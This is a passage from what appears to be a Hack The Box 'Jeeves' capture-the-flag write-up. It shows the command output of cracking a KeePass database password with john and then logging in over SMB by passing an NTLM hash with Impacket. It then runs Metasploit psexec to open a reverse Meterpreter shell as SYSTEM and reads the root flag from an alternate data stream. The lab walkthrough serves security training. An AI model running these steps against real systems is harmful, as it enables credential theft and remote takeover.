-root@kali:~/htb/jeeves# john &ndash;format=KeePass &ndash;wordlist=/usr/share/wordlists/rockyou.txt hash<br>
-Using default input encoding: UTF-8<br>
-Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])<br>
-Press &lsquo;q&rsquo; or Ctrl-C to abort, almost any other key for status<br>
-moonshine1 (CEH)<br>
-1g 0:00:00:52 DONE (2018-05-17 20:25) 0.01922g/s 1057p/s 1057c/s 1057C/s moonshine1<br>
-Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably<br>
-Session completed<br>
-root@kali:~/htb/jeeves# keepass2 CEH.kdbx</p>
-<p><img src="https://imgur.com/sjSlTdI.jpg" alt="4jenkins"></p>
-<p>root@kali:~/htb/jeeves# smbclient.py <a href="mailto:administrator@10.10.10.63">administrator@10.10.10.63</a> -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br>
-Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>
-<p>Type help for list of commands</p>
-<h1 id="help">help</h1>
-<p>open {host,port=445} - opens a SMB connection against the target host/port<br>
-login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&rsquo;ll be prompted<br>
-kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it&rsquo;ll be prompted. Use the DNS resolvable domain name<br>
-login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br>
-logoff - logs off<br>
-shares - list available shares<br>
-use {sharename} - connect to an specific share<br>
-cd {path} - changes the current directory to {path}<br>
-lcd {path} - changes the current local directory to {path}<br>
-pwd - shows current remote directory<br>
-password - changes the user password, the new password will be prompted for input<br>
-ls {wildcard} - lists all the files in the current directory<br>
-rm {file} - removes the selected file<br>
-mkdir {dirname} - creates the directory under the current path<br>
-rmdir {dirname} - removes the directory under the current path<br>
-put {filename} - uploads the filename into the current path<br>
-get {filename} - downloads the filename from the current path<br>
-info - returns NetrServerInfo main results<br>
-who - returns the sessions currently connected at the target host (admin required)<br>
-close - closes the current SMB Session<br>
-exit - terminates the server process (and this session)</p>
-<h1 id="who">who</h1>
-<p>host: \10.10.14.229, user: ADMINISTRATOR, active: 30, idle: 26<br>
-host: \10.10.14.229, user: ADMINISTRATOR, active: 28, idle: 28<br>
-host: \10.10.14.206, user: administrator, active: 21, idle: 0</p>
-<h1 id="password">password</h1>
-<p>New Password:</p>
-<p>msf &gt; use exploit/windows/smb/psexec<br>
-msf exploit(windows/smb/psexec) &gt; show options</p>
-<p>Module options (exploit/windows/smb/psexec):</p>
-<p>Name Current Setting Required Description</p>
-<hr>
-<p>RHOST yes The target address<br>
-RPORT 445 yes The SMB service port (TCP)<br>
-SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing<br>
-SERVICE_DISPLAY_NAME no The service display name<br>
-SERVICE_NAME no The service name<br>
-SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share<br>
-SMBDomain . no The Windows domain to use for authentication<br>
-SMBPass no The password for the specified username<br>
-SMBUser no The username to authenticate as</p>
-<p>Exploit target:</p>
-<p>Id Name</p>
-<hr>
-<p>0 Automatic</p>
-<p>msf exploit(windows/smb/psexec) &gt; set RHOST 10.10.10.63<br>
-RHOST =&gt; 10.10.10.63<br>
-msf exploit(windows/smb/psexec) &gt; set smbpass 123456<br>
-smbpass =&gt; 123456<br>
-msf exploit(windows/smb/psexec) &gt; set smbuser administrator<br>
-smbuser =&gt; administrator<br>
-msf exploit(windows/smb/psexec) &gt; exploit</p>
-<p>[<em>] Started reverse TCP handler on 10.10.14.206:4444<br>
-[</em>] 10.10.10.63:445 - Connecting to the server&hellip;<br>
-[<em>] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user &lsquo;administrator&rsquo;&hellip;<br>
-[</em>] 10.10.10.63:445 - Selecting PowerShell target<br>
-[<em>] 10.10.10.63:445 - Executing the payload&hellip;<br>
-[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable&hellip;<br>
-[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
-[*] Meterpreter session 1 opened (10.10.14.206:4444 -&gt; 10.10.10.63:49672) at 2018-05-17 21:14:07 +0200</p>
-<h1 id="listing-cusersadministratordesktop">meterpreter &gt; getuid<br>
-Server username: NT AUTHORITY\SYSTEM<br>
-meterpreter &gt; cd C:/Users/Administrator/Desktop<br>
-meterpreter &gt; ls<br>
-[-] Unknown command: ls.<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\Administrator\Desktop</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 797 fil 2017-11-08 15:05:18 +0100 Windows 10 Update Assistant.lnk<br>
-100666/rw-rw-rw- 282 fil 2017-11-04 03:03:17 +0100 desktop.ini<br>
-100444/r&ndash;r&ndash;r&ndash; 36 fil 2017-12-24 08:51:10 +0100 hm.txt</p>
-<p>meterpreter &gt; cat hm.txt<br>
-The flag is elsewhere. Look deeper.</p>
-<p>C:\Users\Administrator\Desktop&gt;more &lt; hm.txt:root.txt<br>
-more &lt; hm.txt:root.txt<br>
-afbc5bd4b615a60648cec41c6ac92530</p>
 ]]></content>
         </item>
         
